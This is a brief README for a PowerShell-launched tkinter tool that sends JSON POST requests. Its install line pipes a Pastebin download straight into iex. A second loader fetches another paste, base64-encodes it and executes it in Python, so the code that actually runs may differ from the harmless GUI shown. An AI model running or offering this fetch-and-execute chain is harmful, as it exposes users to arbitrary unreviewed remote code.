# EasyRequest
Make request easily with an interface in one powershell line.
This was entirely videcoded because I needed to test a server.
Just use:
```powershell
iex (iwr "https://pastebin.com/raw/H3N3SVR8")
```

It uses a pastbin link that contains:
```powershell
# PowerShell loader that fetches Python code from a second Pastebin URL
$pyRawUrl = "https://pastebin.com/raw/CfdK8rq2"  # Replace with your actual Python code Pastebin
$pyCode = Invoke-WebRequest -Uri $pyRawUrl
$bytes = [System.Text.Encoding]::UTF8.GetBytes($pyCode.Content)
$base64 = [Convert]::ToBase64String($bytes)
python -c "import base64; exec(base64.b64decode('$base64'))"
```

This powershell script itself runs in python the content of a pastbin which is:
```python
import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests, json
 
def send_request():
    url = url_entry.get()
    try:
        data = json.loads(json_text.get("1.0", tk.END))
    except json.JSONDecodeError:
        messagebox.showerror("Invalid JSON", "The JSON data is not valid.")
        return
 
    try:
        response = requests.post(url, json=data)
        result_text.delete("1.0", tk.END)
        result_text.insert(tk.END, f"Status Code: {response.status_code}\n\n")
        try:
            result_text.insert(tk.END, json.dumps(response.json(), indent=2))
        except ValueError:
            result_text.insert(tk.END, response.text)
    except requests.exceptions.RequestException as e:
        result_text.delete("1.0", tk.END)
        result_text.insert(tk.END, f"Request failed:\n{str(e)}")
 
root = tk.Tk()
root.title("JSON POST Request Tester")
 
tk.Label(root, text="URL (address:port/endpoint):").pack()
url_entry = tk.Entry(root, width=80)
url_entry.pack()
 
tk.Label(root, text="JSON Arguments:").pack()
json_text = scrolledtext.ScrolledText(root, width=80, height=10)
json_text.pack()
 
send_button = tk.Button(root, text="Send POST Request", command=send_request)
send_button.pack(pady=5)
 
tk.Label(root, text="Response:").pack()
result_text = scrolledtext.ScrolledText(root, width=80, height=15)
result_text.pack()
 
root.mainloop()
```
